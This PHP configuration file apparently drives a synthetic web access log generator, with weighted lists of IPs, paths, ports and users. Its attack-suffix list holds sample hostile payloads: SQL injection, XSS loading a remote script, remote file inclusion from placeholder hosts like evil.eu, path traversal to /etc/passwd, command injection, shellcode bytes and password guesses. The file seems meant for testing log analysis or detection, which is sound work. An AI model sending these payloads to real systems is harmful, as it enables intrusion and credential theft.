<?php

// Settings - Configuration
$timezone = 'Europe/Athens';

$request_ips = [
    '54.36.149.94' => 10, //France
    '45.61.164.120' => 15, // USA
    '220.243.135.5' => 30, // China
    '121.225.26.201' => 30, // China
    '87.251.81.179' => 40, // Russia
    '54.36.149.52' => 10, // France
    '209.133.212.79' => 15, // USA
    '115.221.121.44' => 30, // China
    '5.13.35.65' => 5, // Romania
    '183.87.255.54' => 10, // India
    '31.184.238.22' => 20, // Russia
    '182.34.27.162' => 20, // China
    '1.2.169.95' => 5, // Thailand,
    '39.36.99.88' => 8, // Pakistan
    '62.109.16.162' => 40, // Russia
    '86.125.112.230' => 5, // Romania
    '103.36.79.144' => 10, // India
    '91.138.198.224' => 5, // Greece
];

$attack_suffix = [
    '' => 120,
   '?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh' => 20,
   '?username=admin&password=1234' => 10,
    '?username=admin&password=1235' => 10,
    '?username=admin&password=1236' => 10,
    '?username=admin&password=1237' => 10,
    '?username=admin&password=1238' => 10,
    '?username=admin&password=1239' => 10,
    '?username=admin&password=admin' => 10,
    '?username=admin&password=password' => 10,
    '?username=admin&password=admin2' => 10,
    "?page=1&customerId=AND%id%IS%NULL;" => 10,
    "?customerId=1OR%201=1" => 5,
    "?file=http://evil.eu/sh" => 30,
    "?file=http://evil.eu/root.asp" => 5,
    '?post==<?php print $settings[database][password]; ?>' => 15,
    '?ip=|+ls+-l' => 15,
    '?id=0%20or%201=1' => 15,
    '?post=%3script%3ealert(1);' => 25,
    '?session=duf8423ufdjr49cce3ije33ssaq2223' => 3,
    '?session=vwdefcwec334scfdjr49ccededfewsd' => 3,
    '?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00' => 3,
    '?data=%3cscript%20src=%22http%3a%2f%2fwww.hacckingplace.com%2fnasty.js%22%3e%3c%2fscript%3e' => 15,
    '?userid=bob%27%3b%20update%20logintable%20set%20passwd%3d%270wn3d%27%3b--%00' => 15,
    '%u0061?[buffer]=89898' => 8,
    '%2e%2e%2f%2e%2e%2f%2e%2e%2f/bin/bashhttp%3a%2f%2fwww.dvvv23.cin%2fscript.sh' => 15,
    '?user=admin&amount=100000' => 5,
    '%2e%2e%2f%2e%2e%2f%2e%2e%2ffile:///etc/passwd' => 3,
    '?form=\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x80\xe8\xdc\xff\xff\xff/bin/git' => 3,
    '?page=/../../../../../../etc/passwd' => 3,
    '?page=http://192.168.80.128/rfi.php' => 3,
    '?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php' => 5,
    '.env/README.txt' => 10,
    '.well-known/allowed/' => 8,
];

$request_paths = [
    '/' => 100,
    '/index.php/' => 80,
    '/login.php/' => 60,
    '/register.php/' => 20,
    '/orders.php/' => 20,
    '/page/about-us/' => 5,
    '/blog/how-to-shop/' => 5,
    '/blog/better-products-for-2019/' => 2,
    '/blog/our-proposals/' => 2,
    '/core/files/js/upload.js/' => 30,
    '/core/files/js/editor.js/' => 20,
    '/core/themes/theme.inc/' => 5,
    '/update.php/' => 20,
    '/connection.php/' => 20,
    '/xmlrpc.php/' => 3,
    '/authorize.php/' => 5,
    '/api/v1/customers/' => 20,
    '/api/v1/login/' => 40,
    '/api/v1/orders/' => 10,
    '/api/v1/register/' => 30,
    '/cgi-bin/count.cgi/' => 5
];

$request_ports = [
    '8000' => 2,
    '443' => 5,
    '80' => 100,
];

$request_http_verbs = [
    'POST' => 5,
    'GET' => 100,
];

$request_http_status = [
    '304' => 2,
    '404' => 20,
    '503' => 2,
    '200' => 100,
];

$request_http_version = [
    'HTTP/1.0' => 10,
    'HTTP/1.1' => 2,
];

$request_users = [
    'fakeadmin' => 10,
    'bob' => 1,
    'mary88' => 1,
    'sissy' => 1,
    'nick23' => 1,
    'pianoplayer1990' => 1,
    'anonymous' => 100,
];
